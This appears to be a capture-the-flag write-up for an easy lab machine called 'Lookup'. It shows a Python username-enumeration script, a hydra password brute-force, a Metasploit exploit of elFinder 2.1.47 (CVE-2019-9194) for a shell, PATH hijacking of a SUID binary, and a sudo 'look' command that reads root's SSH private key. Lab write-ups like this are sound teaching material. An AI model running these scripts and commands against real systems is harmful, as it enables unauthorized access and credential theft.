
**Target IP:** `10.10.249.27`
**Difficulty:** `Easy`
**Categories:** Web, Privilege Escalation
_________

## Enumeration

Starting off with a `nmap` scan to discover open ports and services - 

`sudo nmap -sV -sC 10.10.249.27 -T4 -vv`

Output - 

~~~
Discovered open port 22/tcp on 10.10.249.27
Discovered open port 80/tcp on 10.10.249.27
	http-title: Did not follow redirect to http://lookup.thm
~~~~


We can visit the website at `10.10.249.27` after adding an entry in `/etc/hosts` file.

~~~
10.10.249.27    lookup.thm
~~~~

There is a login page.

`admin:admin` credentials gives a message: 
_____

Using a python script to find valid users:

~~~
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target URL
url = "http://lookup.thm/login.php"

# Wordlist file
wordlist = "/usr/share/seclists/Usernames/Names/names.txt"

# Common incorrect password to use in testing
password = "randompassword"

# Define an invalid username to compare responses
invalid_username = "invaliduser1234"

# Get baseline response for an invalid username
baseline_response = requests.post(url, data={"username": invalid_username, "password": password})
invalid_response_length = len(baseline_response.text)

print(f"[*] Baseline response length for invalid username: {invalid_response_length}")

# Function to test a single username
def test_username(username):
    username = username.strip()
    if not username:
        return None

    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=5)
        if len(response.text) != invalid_response_length:
            return username
    except requests.RequestException:
        return None
    return None

# Read all usernames
with open(wordlist, "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

# Run the checks in parallel
found_usernames = []
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(test_username, username): username for username in usernames}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(f"[+] Potential valid username found: {result}")
            found_usernames.append(result)

~~~~~

`python3 user_enum2.py`

Output - 

~~~
[*] Baseline response length for invalid username: 74
[+] Potential valid username found: admin
[+] Potential valid username found: jose
~~~~


Alternately - 

To find the baseline content length in response we can send a request using curl

```
curl -s -X POST -d "username=invaliduser1234&password=randompassword" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     http://lookup.thm/login.php | wc -c

```

`ffuf` Command for Username Enumeration

```
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&password=randompassword" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://lookup.thm/login.php \
     -fs 74 

```

~~~
Note:

-fs       Filter by response size (skip responses with this length)
~~~~

~~~
admin                   [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 173ms]
jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 182ms]

~~~~

____________

Finding a valid password for user `jose`.

`hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again.<br>Redirecting in 3 seconds." -V`

~~~
[80][http-post-form] host: lookup.thm   login: jose   password: password123
~~~~

Logging in with the credentials `jose:password123` redirects us to `files.lookup.thm`. 

We have to add this domain to our `/etc/hosts` file along with `lookup.thm`.

We are then taken to an online file manager called `elfinder`.

Looking around the file manager, here are some findings - 

~~~
credentials.txt
think : nopassword

app version: 2.1.47 
~~~~~
______

## Exploitation

On searching `exploit-db`, there is an exploit for elfinder version 2.1.47: `CVE:2019-9194` 

This is a **'PHP connector' Command Injection**.

Using `msfconsole` and searching for `elfinder`, There is a metasploit module for this.

We can set `RHOSTS` as `files.lookup.thm` and `LHOST` as our machine IP and run the exploit.

We successfully get a meterpreter shell.

Using the `shell` command, the meterpreter shell is converted to a normal terminal.
______

## Privilege Escalation

### Part 1

`find / -type f -perm -04000 -ls 2>/dev/null`

~~~
9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm
~~~~

The only suspicious binary is `pwm` as it is custom and unknown. On executing it:

~~~
cd /usr/sbin

./pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
~~~

It is extracting the `id` of the current user. To understand the mechanism, lets download the executable by copying it to the home directory of the web server then access it from `lookup.thm/pwm`.

`cp pwm /var/www/lookup.thm/public_html`

We can use `binary ninja` tool to reverse engineer the code and find that indeed the program reads the `id` executable.

![[Lookup-Img-1.png]]

Since the program uses a relative path to the `id` command, We can point to a different `id` executable in `tmp` directory.

`cd /tmp`

Mimicking the original `id` command to be read as user `think`.

```
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
```

Running the `pwm` command again, we successfully get the contents of `.password` file. 

**Password:** `josemario.AKA(think)`

`ssh think@10.10.217.130`

~~~
think@lookup:~$ whoami
think

think@lookup:~$ ls
user.txt

~~~~
______

### Part 2

Checking for sudo privileges of the user

~~~
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look

~~~~

The user can run look command with sudo privileges. A a lookup on `gtfobins` shows that this command can be used to read files with higher privileges. We can use it to read the `/root/.ssh/id_rsa` file which will allow us to ssh as `root`.

```
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

The ssh key can be copied to our local machine and saved as id_rsa.

Modify the permissions of the file: `chmod 600 id_rsa`

The following command is used to ssh as root using its ssh key.

`ssh root@10.10.249.27 -i id_rsa`

Viola! We have successfully logged in as `root`. A simple `ls` command reveals the flag file.
